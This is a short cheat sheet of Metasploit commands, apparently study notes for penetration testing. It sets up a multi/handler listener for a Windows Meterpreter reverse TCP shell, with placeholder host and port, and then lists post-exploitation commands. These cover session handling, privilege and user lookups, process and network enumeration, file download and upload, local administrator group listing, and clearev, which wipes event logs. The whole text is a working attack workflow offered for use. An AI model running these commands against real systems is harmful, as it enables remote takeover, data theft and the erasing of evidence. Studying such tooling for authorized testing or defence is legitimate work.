```bash
msfconsole
---
use exploit/multi/handler
show options
set payload payload/windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
exploit -j
jobs
sessions 
sessions -i 2
---
dir
sysinfo
bg
shell
enumdesktops
getdesktop
clearev
getpid
getprivs
getsid
getuid
localtime
ps
download <file>
upload <file>
getlwd
pwd
ls
lls
lpwd
arp
getproxy
ifconfig
ipconfig
netstat
route
help
route -h
shell
net use
net localgroup Administrators
```
